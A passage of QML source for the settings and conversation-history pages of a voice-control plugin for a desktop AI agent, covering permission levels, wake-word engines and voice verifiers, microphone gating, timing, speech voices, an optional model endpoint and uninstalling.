              font.pixelSize: Style.font.caption
            }
            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "AGENT PROJECT FOLDER AND PERMISSIONS"

              TextField {
                width: parent.width
                text: root.projectDir
                placeholderText: "~  (your home directory)"
                foreground: root.foreground
                font.family: root.fontFamily
                onEditingFinished: {
                  if (text !== root.projectDir) root.persist("projectDir", text, false)
                }
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "Where the agent works. Everything it reads, writes or runs " +
                      "happens here. Changing it starts a new conversation, because " +
                      "the agent keeps its history per project."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              // Left empty, the agent still starts in the home directory --
              // but home is not a project, and "edits" will not write
              // unasked there. Said here because the silent version of this
              // was the worst of both: a blanket grant over .bashrc, the
              // systemd units and shell.json, which is where this very
              // setting lives.
              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                visible: root.projectDir.trim() === ""
                         && root.permissionLevel === "edits"
                text: "⚠  No folder set, so there is nothing for “edits” to be " +
                      "inside: every change is prompted until you name one. " +
                      "Your home directory is not accepted as a project — it " +
                      "holds the file this permission level is stored in."
                color: Commons.Color.urgent
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Dropdown {
                width: parent.width
                visible: root.vTakesModel
                showLabel: true
                label: "Model for " + root.vAgent
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.agentModelOptions
                value: root.customModel ? "__other__" : root.agentModel()
                onChanged: function(v) {
                  if (v === "__other__") { root.customModel = true; return }
                  root.customModel = false
                  if (v !== root.agentModel()) root.setModel(v)
                }
              }

              TextField {
                width: parent.width
                visible: root.vTakesModel && root.customModel
                text: root.agentModel()
                placeholderText: "type a model name or full model id"
                foreground: root.foreground
                font.family: root.fontFamily
                onEditingFinished: {
                  if (text.trim() !== root.agentModel()) root.setModel(text)
                }
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                visible: root.vTakesModel
                text: "Only for voice; your other sessions keep their own model. " +
                      "For Claude: sonnet, opus, haiku or a full model id. " +
                      "Changing it starts a new conversation." +
                      (root.agentModel() !== ""
                       && !/^[A-Za-z0-9][A-Za-z0-9._:\/@\[\]-]{0,127}$/.test(root.agentModel())
                       ? "  ⚠  Not accepted as a model name, so the default is in use." : "")
                textFormat: Text.PlainText
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Dropdown {
                width: parent.width
                showLabel: true
                label: root.vAgent === "" ? "Permission level"
                                          : "Permission level for " + root.vAgent
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.levelOptions
                value: root.permissionLevel
                onChanged: function(v) { root.setLevel(v) }
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: (root.vPosture !== "" ? "In force: " + root.vPosture + ".  " : "")
                      + (root.agentLevels.indexOf("edits") < 0
                         ? (root.vAgent === "" ? "" : root.vAgent + " cannot put a " +
                            "question on screen, so it is held read-only instead and " +
                            "may refuse work rather than ask. Only the trusted level " +
                            "changes that.")
                         : root.permissionLevel === "edits"
                         ? "Source files inside the project can be edited without " +
                           "asking. Commands, web fetches and anything outside it " +
                           "still prompt — and so do files that make something else " +
                           "run, like .git/hooks, .envrc or .claude/settings.json."
                         : root.permissionLevel === "trusted"
                         ? "Nothing is asked. A spoken sentence can edit files and run " +
                           "commands here with nothing able to stop it."
                         : "Every change is prompted, and so is anything that " +
                           "reaches the network or your own MCP servers. Reading " +
                           "is free except for keys, credentials and shell " +
                           "history. An unanswered prompt is denied.")
                color: root.permissionLevel === "trusted" ? Commons.Color.urgent : root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                visible: root.vOverriding !== ""
                text: "⚠  This endpoint is answering instead of " + root.vOverriding +
                      ", which is what Omarchy's own settings are set to. Clear " +
                      "both boxes below to go back to it."
                color: Commons.Color.urgent
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "KEY BINDINGS AND INTERRUPTIONS"

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                textFormat: Text.StyledText
                text: "<b>Hold F8</b> and speak, release when you are done — no " +
                      "wake word needed.<br>" +
                      "<b>Press F8</b> while it is replying to stop it. So does " +
                      "<b>Super+Ctrl+Space</b>, or the stop button in the panel.<br>" +
                      "<b>Super+Alt+Space</b> releases the microphone entirely."
                color: root.foreground
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Toggle {
                width: parent.width
                label: "Let me interrupt by talking"
                description: "Stop speaking when it hears you over it. Measure " +
                             "first with: agentvoice calibrate"
                checked: root.setting("bargeIn", false) === true
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("bargeIn",
                    root.setting("bargeIn", false) === true ? "false" : "true", true)
              }

              KnobRow {
                width: parent.width
                visible: root.setting("bargeIn", false) === true
                scrollTarget: formScroll
                label: "How much louder you must be"
                unit: "%"
                description: "Above its own voice, before it stops. Higher is " +
                             "harder to trigger by accident and on purpose."
                value: root.setting("bargeFactor", 150)
                minimum: 110; maximum: 400; stepSize: 10
                onCommitted: function(v) { root.persist("bargeFactor", v, true) }
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "No spoken phrase can interrupt a reply: the microphone is " +
                      "ignored while it talks, and at a normal volume its own " +
                      "voice reaches the mic as loudly as yours anyway. " +
                      "Saying \"stop\" or \"never mind\" cancels a turn it has " +
                      "not taken yet — useful when the wake word fires by " +
                      "mistake, so nothing is sent to the agent."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "WAKE WORD"

              Dropdown {
                width: parent.width
                showLabel: true
                label: "Engine"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.engineOptions
                value: root.engine
                onChanged: function(v) {
                  root.persist("engine", v, false)
                  if (v === "openwakeword" && !root.owwAvailable)
                    root.fetchNow(["--oww"])
                }
              }

              // The state that had no representation here at all. Choosing
              // openWakeWord without the package installed left the daemon
              // falling back to Vosk while this page went on showing an
              // openWakeWord model, threshold and verifier. The controls below
              // now follow what is actually listening; this says why.
              Column {
                width: parent.width
                spacing: Style.space(4)
                visible: root.usingOww && !root.owwAvailable

                Text {
                  width: parent.width
                  wrapMode: Text.WordWrap
                  text: "openWakeWord is not installed, so Vosk is listening instead. " +
                        "It was offered during install and can be added now — about " +
                        "154MB, and it brings real rejection plus verifiers trained " +
                        "from your own voice."
                  color: Commons.Color.urgent
                  font.family: root.fontFamily
                  font.pixelSize: Style.font.caption
                }

                Button {
                  text: "Try installing openWakeWord again…"
                  fontFamily: root.fontFamily
                  onClicked: {
                    root.fetchNow(["--oww"])
                  }
                }
              }

              // One dropdown per engine rather than one that swaps its options.
              // Swapping left the previous engine's value displayed -- picking
              // "hey claude" under Vosk and then switching engines still showed
              // "hey claude", which openWakeWord has no model for.
              Dropdown {
                width: parent.width
                visible: !root.owwLive
                showLabel: true
                label: "Phrase"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.phraseOptions
                value: root.setting("phrase", "hey computer")
                onChanged: function(v) { root.persist("phrase", v, false) }
              }

              Dropdown {
                width: parent.width
                visible: root.owwLive
                showLabel: true
                label: "Phrase"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.owwOptions
                value: root.setting("owwModel", "hey_jarvis")
                onChanged: function(v) { root.persist("owwModel", v, false) }
              }

              Text {
                width: parent.width
                visible: root.owwLive
                wrapMode: Text.WordWrap
                text: "Only these ship pretrained. A different phrase means training " +
                      "your own model — see TRAINING YOUR OWN PHRASE below."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                visible: root.owwLive
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Detection threshold"
                unit: "%"
                description: "Measured on a 2014 MacBook Pro: the real phrase peaks near 99 and a " +
                             "phonetically similar phrase near 90, so 90 rejects " +
                             "the near miss and still fires reliably."
                value: root.setting("owwThresholdPct", 90)
                minimum: 10; maximum: 99; stepSize: 1
                onCommitted: function(v) { root.persist("owwThresholdPct", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                visible: !root.owwLive
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Grammar confidence"
                unit: "%"
                description: "Weak against phonetic neighbours by nature: a grammar " +
                             "must pick between the phrase and anything-else, so " +
                             "\"hey cloud\" scores as high as \"hey claude\". Switch " +
                             "engines if a phone keeps waking it."
                value: root.setting("wakeConfidencePct", 70)
                minimum: 0; maximum: 100; stepSize: 5
                onCommitted: function(v) { root.persist("wakeConfidencePct", v, true) }
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "TRAIN WAKE WORD TO YOUR VOICE"

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "The stock wake models are speaker independent, so a podcast " +
                      "or phone saying the phrase gets through. A verifier trained " +
                      "on your voice is the only layer that knows who is talking."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              // Whether one is in force was known only to a log line. Training
              // one and seeing the screen unchanged reads as the training
              // having failed.
              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                visible: root.owwLive
                // Three states, not two. A trained verifier that is switched
                // off read as "no verifier yet" -- the one message that would
                // send someone back to redo work they had already done.
                text: root.vVerifier
                      ? "\u2713  In use for “" + root.activePhrase + "”. Only your " +
                        "voice saying it gets through."
                      : root.setting("useVerifier", true) !== true
                        ? "Trained for \u201c" + root.activePhrase + "\u201d and switched " +
                          "off below, so anyone can wake it. The training is kept."
                        : "No verifier for \u201c" + root.activePhrase + "\u201d yet \u2014 anyone " +
                          "saying the phrase can wake it. Verifiers are per phrase, " +
                          "so training a new wake word means training a new one."
                color: root.vVerifier ? root.foreground : root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              // The switch that had no switch. `use_verifier` has existed in
              // OwwWake since it was written and nothing ever passed it, so the
              // only way to stop verifying was to delete the .joblib -- a file
              // operation that also threw the training away. It matters most for
              // someone else at this computer: the verifier is built to reject
              // them, so from their side the machine ignores them and nothing
              // says why.
              Toggle {
                width: parent.width
                visible: root.owwLive
                label: "Only wake for my voice"
                description: "Off lets anyone wake it. Your training stays on disk."
                checked: root.setting("useVerifier", true) === true
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("useVerifier",
                    root.setting("useVerifier", true) === true ? "false" : "true", true)
              }

              // A disabled button that does nothing when clicked reads as a bug,
              // not as a precondition -- so on Vosk there is no dead control
              // here at all. The button becomes the fix instead: it switches the
              // engine, which is the thing that was missing.
              Button {
                text: root.owwLive ? "Train a verifier from your voice…"
                                   : !root.owwAvailable
                                     ? "Install openWakeWord to enable this"
                                     : "Switch to openWakeWord to enable this"
                fontFamily: root.fontFamily
                onClicked: {
                  // Switching to an engine that is not installed changes nothing
                  // a user can see -- the daemon just falls back again. Send them
                  // to the installer instead, which is the actual precondition.
                  if (!root.owwAvailable) {
                    root.fetchNow(["--oww"])
                    return
                  }
                  if (!root.usingOww) {
                    root.persist("engine", "openwakeword", false)
                    return
                  }
                  trainer.command = ["omarchy-launch-floating-terminal-with-presentation",
                                     "agentvoice-train-verifier"]
                  trainer.running = true
                  root.dismiss()
                }
              }

              Text {
                width: parent.width
                visible: !root.owwLive
                wrapMode: Text.WordWrap
                text: "Verifiers attach to an openWakeWord model. Vosk has no model " +
                      "to attach one to, so training is unavailable while it is selected."
                color: Commons.Color.urgent
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "TRAINING YOUR OWN WAKE WORD"
              visible: root.owwLive

              Text {
                visible: root.owwLive
                width: parent.width
                wrapMode: Text.WordWrap
                text: "A verifier refines an existing model; it cannot create a new " +
                      "phrase. For a phrase openWakeWord was not shipped with, train " +
                      "one in a Colab notebook — about 2.5 hours on the free tier, " +
                      "90 minutes on Colab Pro. You edit two lines: the phrase and " +
                      "the output name.\n\n" +
                      "Only the small classifier head is trained; the feature models " +
                      "it sits on ship with openWakeWord and do not change. That is " +
                      "why it is quick, and why training is network-bound rather " +
                      "than GPU-bound."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Button {
                visible: root.owwLive
                text: "Open the training notebook…"
                fontFamily: root.fontFamily
                onClicked: Quickshell.execDetached(["omarchy-launch-browser",
                  "https://github.com/alfiedennen/openwakeword-colab-2026"])
              }

              Text {
                visible: root.owwLive
                width: parent.width
                wrapMode: Text.WordWrap
                text: "Upstream's own notebook has not been maintained since 2023; " +
                      "this one is patched for current Python and torchaudio.\n\n" +
                      "Save the .onnx it gives you into " +
                      "~/.local/share/agentvoice/wakewords/ and it appears in the " +
                      "phrase list above, ready for its own verifier. Check it with " +
                      "'agentvoice monitor' before trusting it: this ships " +
                      "openwakeword 0.4.0, and a model built against a newer one " +
                      "should load but has not been proven to."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "MICROPHONE"

              // Not a setting, deliberately: it is a security property, and a
              // setting is a thing that gets switched off once and forgotten.
              // Said here because behaviour nobody can see is behaviour
              // nobody trusts -- and because "why did it stop answering"
              // has exactly one answer worth printing.
              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "The microphone closes while the screen is locked, and " +
                      "opens again when you unlock. Locking does not change " +
                      "the switch above: if you had released the microphone " +
                      "before locking, it stays released afterwards."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              // Named, so the bars inside address it directly. They reached it
              // through parent.parent, which resolves at runtime and silently
              // breaks the moment anything is nested between -- and which the
              // linter cannot check, because `parent` is only ever an Item.
              Item {
                id: meter
                width: parent.width
                height: Style.space(18)
                readonly property real span: 60
                readonly property real levelFrac: Math.max(0, Math.min(1, (root.levelDb + span) / span))
                readonly property real gateFrac: Math.max(0, Math.min(1, (root.setting("micThresholdDb", -38) + span) / span))
                readonly property bool gateOpen: root.levelDb >= root.setting("micThresholdDb", -38)

                Rectangle {
                  anchors.verticalCenter: parent.verticalCenter
                  width: parent.width
                  height: Style.space(8)
                  radius: height / 2
                  color: Qt.darker(root.background, 1.4)
                  Rectangle {
                    width: Math.max(0, parent.width * meter.levelFrac)
                    height: parent.height
                    radius: parent.radius
                    color: meter.gateOpen ? root.foreground : Qt.darker(root.foreground, 2.2)
                  }
                }
                Rectangle {
                  x: meter.width * meter.gateFrac
                  width: Math.max(2, Style.space(2))
                  height: meter.height
                  color: Commons.Color.urgent
                }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Microphone gate"
                unit: " dBFS"
                // Rewritten because it led with what the setting does *not* do
                // on openWakeWord and left the reader to infer what it does.
                // It has one job on both engines -- deciding which frames count
                // as you talking, which is what ends your turn -- and one extra
                // on Vosk.
                description: "Where your voice stops and the room starts. " +
                             "Anything above the line counts as you talking, so " +
                             "this is what ends your turn: once you have been " +
                             "under the line for \u201cPause that ends a turn\u201d " +
                             "in TIMING, it stops listening. Set it too low " +
                             "and room noise holds the turn open; too high and a " +
                             "quiet word cuts you off. The bar above is the live " +
                             "level and the red mark is this setting — talk " +
                             "normally and put the line under it." +
                             (root.owwLive ? "" :
                               " On Vosk it also gates the wake word: quieter " +
                               "frames never reach the grammar, so the phrase " +
                               "cannot be matched against room noise.")
                value: root.setting("micThresholdDb", -38)
                minimum: -60; maximum: -20; stepSize: 1
                onCommitted: function(v) { root.persist("micThresholdDb", v, true) }
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "TIMING"

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Time to start speaking"
                description: "After the wake word it waits this long for you to " +
                             "make a sound. If you do not, it gives up quietly " +
                             "and goes back to listening for the wake word. Once " +
                             "you start talking this no longer applies — the " +
                             "pause below ends the turn instead. Err generous: " +
                             "being cut off before you have started is the most " +
                             "irritating way this can fail."
                value: root.setting("leadInMs", 5000)
                minimum: 1000; maximum: 15000; stepSize: 500
                onCommitted: function(v) { root.persist("leadInMs", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Pause that ends a turn"
                value: root.setting("trailingSilenceMs", 1200)
                minimum: 400; maximum: 4000; stepSize: 100
                onCommitted: function(v) { root.persist("trailingSilenceMs", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Shorter pause when you sound finished"
                description: "Whisper works through what you said at each " +
                             "pause, so by the time you stop it usually has " +
                             "the words already. When they read as a finished " +
                             "sentence, this much quiet ends the turn instead " +
                             "of the full pause above. Trailing off, or " +
                             "stopping on a word like \"and\" or \"the\", " +
                             "still waits the full pause. 0 turns it off."
                value: root.setting("quickEndMs", 800)
                minimum: 0; maximum: 2000; stepSize: 100
                onCommitted: function(v) { root.persist("quickEndMs", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Deaf period after speaking"
                description: "One microphone beside the speakers cannot win against " +
                             "its own output, so the mic goes deaf while the voice " +
                             "talks and for this long after."
                value: root.setting("echoTailMs", 350)
                minimum: 0; maximum: 1500; stepSize: 50
                onCommitted: function(v) { root.persist("echoTailMs", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Ignore a turn shorter than"
                description: "Measured on the whole recording — the wake word to " +
                             "the end of the pause — not on the speech inside " +
                             "it. It throws away a turn too short to hold " +
                             "anything, which in practice means a wake word that " +
                             "fired on a noise. With the pause above at its " +
                             "default this rarely triggers, since any finished " +
                             "turn already contains that much silence; it starts " +
                             "to matter once you shorten the pause."
                value: root.setting("minUtteranceMs", 400)
                minimum: 0; maximum: 2000; stepSize: 100
                onCommitted: function(v) { root.persist("minUtteranceMs", v, true) }
              }

              KnobRow {
                width: parent.width
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Hard ceiling on one turn"
                description: "A microphone stuck open stops here rather than " +
                             "recording forever."
                value: root.setting("maxUtteranceMs", 30000)
                minimum: 5000; maximum: 120000; stepSize: 5000
                onCommitted: function(v) { root.persist("maxUtteranceMs", v, true) }
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "SPEECH"

              Dropdown {
                width: parent.width
                showLabel: true
                label: "Transcription model"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.modelOptions
                value: root.setting("model", "tiny.en")
                onChanged: function(v) { root.persist("model", v, false) }
              }

              Dropdown {
                width: parent.width
                showLabel: true
                label: "Live transcript while you speak"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: [
                  { label: "auto — only when it is free", value: "auto" },
                  { label: "on — costs 114MB",            value: "on" },
                  { label: "off",                          value: "off" }
                ]
                value: root.setting("livePartials", "auto")
                onChanged: function(v) { root.persist("livePartials", v, false) }
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "Rough text shown as you talk, before Whisper returns. It " +
                      "needs the Vosk model resident. On the Vosk wake engine " +
                      "that model is already loaded, so it is free; on " +
                      "openWakeWord it is an extra 114MB."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              Dropdown {
                width: parent.width
                showLabel: true
                label: "Spoken voice"
                fontFamily: root.fontFamily
                foreground: root.foreground
                options: root.voiceOptions
                value: root.setting("voice", "lessac-medium")
                onChanged: function(v) {
                  root.persist("voice", v, false)
                  if (root.voicesOnDisk.length > 0
                      && root.voicesOnDisk.indexOf(v) < 0)
                    root.fetchVoice(v)
                }
              }

              // Choosing the voice already starts this. The banner and button are
              // for afterwards: a download declined, a terminal closed, no network
              // at the time. Without them the only way back would be to pick a
              // different voice and pick this one again.
              Column {
                width: parent.width
                spacing: Style.space(4)
                visible: root.voicesOnDisk.length > 0
                         && root.voicesOnDisk.indexOf(
                              root.setting("voice", "lessac-medium")) < 0

                Text {
                  width: parent.width
                  wrapMode: Text.WordWrap
                  text: "\u201c" + root.setting("voice", "lessac-medium") +
                        "\u201d is not on this machine, so it is speaking in " +
                        "one that is. Voices are about 60MB each."
                  color: Commons.Color.urgent
                  font.family: root.fontFamily
                  font.pixelSize: Style.font.caption
                }

                Button {
                  // Names the voice, as the dropdown does. Passing no name left
                  // it to install.sh to read the setting, which is a race the
                  // flag exists to avoid.
                  text: "Try the download again\u2026"
                  fontFamily: root.fontFamily
                  onClicked: root.fetchVoice(
                      root.setting("voice", "lessac-medium"))
                }
              }
            }

            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "MODEL API ENDPOINT (OPTIONAL)"

              TextField {
                width: parent.width
                text: root.setting("endpointUrl", "")
                placeholderText: "http://your-machine:11434/v1"
                foreground: root.foreground
                font.family: root.fontFamily
                onEditingFinished: {
                  if (text !== root.setting("endpointUrl", ""))
                    root.persist("endpointUrl", text, false)
                }
              }

              TextField {
                width: parent.width
                text: root.setting("endpointModel", "")
                placeholderText: "model name, e.g. llama3.2"
                foreground: root.foreground
                font.family: root.fontFamily
                onEditingFinished: {
                  if (text !== root.setting("endpointModel", ""))
                    root.persist("endpointModel", text, false)
                }
              }

              Toggle {
                width: parent.width
                visible: root.setting("endpointUrl", "") !== ""
                label: "This endpoint is an agent"
                description: "Tick when it can run commands or change files on " +
                             "its own host, as Hermes can. agentvoice cannot tell " +
                             "from the URL, so it claims nothing about the far " +
                             "end unless you say — and gives it longer to answer, " +
                             "because an agent goes quiet while it runs tools."
                checked: root.setting("endpointIsAgent", false) === true
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("endpointIsAgent",
                    root.setting("endpointIsAgent", false) === true
                      ? "false" : "true", true)
              }

              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                text: "Any OpenAI-compatible endpoint — Ollama, LM Studio, vLLM, " +
                      "OpenAI, xAI, Hermes. Set both boxes and it answers instead " +
                      "of the desktop's agent.\n" +
                      "agentvoice offers it no tools and gates nothing, so the " +
                      "permission level above does not reach it. What the endpoint " +
                      "itself can do is not visible from here: Ollama cannot touch " +
                      "anything, while Hermes has a terminal and a filesystem on " +
                      "its host. That is what the tickbox is for.\n" +
                      "Ollama and LM Studio need no key. For one that does, the " +
                      "login keyring is the best place — it unlocks when you log " +
                      "in and only this session can read it:\n" +
                      "  secret-tool store --label=agentvoice \\\n" +
                      "      service agentvoice endpoint api.openai.com\n" +
                      "Keyed by host and port, so two services on one machine do " +
                      "not share a key. Failing that, " +
                      "~/.config/agentvoice/endpoint.key. Never in this settings " +
                      "file — it is the desktop's config and gets copied around."
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }
            }

            PanelSeparator { width: parent.width; foreground: root.foreground }

            // Last on the page, and the only red control on it. Removal lives
            // inside the settings it removes because nothing runs on the way
            // out: `omarchy plugin remove` is an rm -rf with no hook, so the
            // only moment this can clean up after itself is while it exists.
            Button {
              text: "Remove Agent Voice…"
              fontFamily: root.fontFamily
              foreground: Commons.Color.urgent
              accent: Commons.Color.urgent
              onClicked: {
                // One command, no shell logic. The launcher already does
                // `cmd="$*"` and re-wraps it in its own `bash -c`, and a second
                // one here swallowed the flag as $0 -- which ran this as a fresh
                // *install* instead. The widget removal used to be chained on
                // with `&&`; it is --with-widget now, so the script can check
                // afterwards that it actually happened.
                // XDG_DATA_HOME, not ~/.local/share: that is where install.sh
                // puts it, and with the variable set this button used to run
                // a script that was not there.
                remover.command = ["omarchy-launch-floating-terminal-with-presentation",
                                   root.shq(root.dataHome +
                                            "/agentvoice/app/install.sh") +
                                   " --uninstall --with-widget"]
                remover.running = true
                root.dismiss()
              }
            }

            Text {
              width: parent.width
              wrapMode: Text.WordWrap
              text: "Removes the engine, the service and the widget in one go. " +
                    "Your trained verifiers, recordings and API keys are kept, " +
                    "and it says where they are on the way out."
              color: root.dim
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }

            Process { id: remover }

            Item { width: 1; height: Style.space(12) }
          }
        }

        // --- the conversation -----------------------------------------
        Item {
          id: historyPage
          visible: root.mode === "history"
          width: parent.width
          height: body.height - y - Style.spacing.md

          ListView {
            id: historyList
            anchors.top: parent.top
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.bottom: historyFooter.top
            anchors.bottomMargin: Style.spacing.md
            clip: true
            spacing: Style.spacing.xxxl
            model: historyModel
            boundsBehavior: Flickable.StopAtBounds
            flickableDirection: Flickable.VerticalFlick
            QQC.ScrollBar.vertical: QQC.ScrollBar {
              policy: QQC.ScrollBar.AsNeeded
            }

            // At the end while you are at the end, so a turn taken with the
            // page open appears without scrolling; left alone once you have
            // scrolled back to read.
            property bool following: true
            onMovementEnded: following = atYEnd
            onCountChanged: if (following) Qt.callLater(historyList.positionViewAtEnd)

            delegate: Column {
              id: turn
              required property int index
              required property real at
              required property string agent
              required property string transcript
              required property string reply
              required property string failed
              required property bool stopped
              required property bool fresh
              required property int latency

              width: ListView.view ? ListView.view.width - Style.space(10) : 0
              spacing: Style.space(4)

              // Where a conversation began: a turn sent with no session to
              // continue. "What did I ask it earlier" is usually this one.
              Item {
                visible: turn.fresh && turn.index > 0
                width: parent.width
                height: visible ? newLabel.implicitHeight + Style.space(10) : 0
                PanelSeparator {
                  anchors.verticalCenter: newLabel.verticalCenter
                  width: parent.width
                  foreground: root.foreground
                }
                Text {
                  id: newLabel
                  anchors.horizontalCenter: parent.horizontalCenter
                  leftPadding: Style.space(8)
                  rightPadding: Style.space(8)
                  text: "new conversation"
                  color: root.dim
                  font.family: root.fontFamily
                  font.pixelSize: Style.font.caption
                  Rectangle {
                    z: -1
                    anchors.fill: parent
                    color: root.background
                  }
                }
              }

              Text {
                text: root.timeOf(turn.at)
                      + (turn.agent !== "" ? " · " + turn.agent : "")
                      + (turn.latency > 0
                         ? " · answered in " + (turn.latency / 1000).toFixed(1) + "s" : "")
                color: root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              // TextEdit, read-only, rather than Text: selectable, so a path
              // or a command the agent read out can be copied, not retyped.
              // Plain text for the same reason every other transcript here
              // is -- neither half of this was written by us.
              TextEdit {
                width: parent.width
                readOnly: true
                selectByMouse: true
                wrapMode: TextEdit.Wrap
                textFormat: TextEdit.PlainText
                text: turn.transcript
                color: root.foreground
                selectionColor: Qt.rgba(root.foreground.r, root.foreground.g,
                                        root.foreground.b, 0.3)
                selectedTextColor: root.foreground
                font.family: root.fontFamily
                font.pixelSize: Style.font.body
              }

              Item {
                visible: turn.reply !== ""
                width: parent.width
                height: replyText.implicitHeight

                // A rule down the left of the answer, rather than an arrow in
                // its text that would come along with every copy.
                Rectangle {
                  width: Style.space(2)
                  height: parent.height
                  color: Qt.rgba(root.foreground.r, root.foreground.g,
                                 root.foreground.b, 0.35)
                }
                TextEdit {
                  id: replyText
                  x: Style.space(10)
                  width: parent.width - x
                  readOnly: true
                  selectByMouse: true
                  wrapMode: TextEdit.Wrap
                  textFormat: TextEdit.PlainText
                  text: turn.reply
                  color: Qt.rgba(root.foreground.r, root.foreground.g,
                                 root.foreground.b, 0.8)
                  selectionColor: Qt.rgba(root.foreground.r, root.foreground.g,
                                          root.foreground.b, 0.3)
                  selectedTextColor: root.foreground
                  font.family: root.fontFamily
                  font.pixelSize: Style.font.body
                }
              }

              Text {
                visible: turn.failed !== "" || turn.stopped
                text: turn.failed !== "" ? "failed" : "stopped part-way"
                color: turn.failed !== "" ? Commons.Color.urgent : root.dim
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }
            }
          }

          Text {
            anchors.centerIn: historyList
            width: Math.min(parent.width, Style.space(380))
            visible: historyModel.count === 0
            horizontalAlignment: Text.AlignHCenter
            wrapMode: Text.WordWrap
            text: root.keepHistory
                  ? "Nothing yet this session.\n\nEach exchange appears here " +
                    "as it ends, and is kept in memory until you log out."
                  : "Keeping the conversation is off.\n\nTurn it on in " +
                    "settings, under While you interact with it."
            color: root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.body
          }

          Item {
            id: historyFooter
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.bottom: parent.bottom
            height: clearButton.implicitHeight

            Text {
              anchors.left: parent.left
              anchors.verticalCenter: parent.verticalCenter
              width: parent.width - clearButton.width - Style.space(12)
              elide: Text.ElideRight
              text: historyModel.count + (historyModel.count === 1 ? " exchange" : " exchanges")
                    + " · in memory only, gone at logout · drag across text to copy it"
              color: root.dim
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }
            Button {
              id: clearButton
              anchors.right: parent.right
              visible: historyModel.count > 0
              text: root.confirmClear ? "Clear it all?" : "Clear"
              fontFamily: root.fontFamily
              onClicked: {
                if (!root.confirmClear) {
                  root.confirmClear = true
                  clearTimeout.restart()
                  return
                }
                root.confirmClear = false
                clearHistory.running = true
              }
            }
          }
        }
      }
    }
  }
}
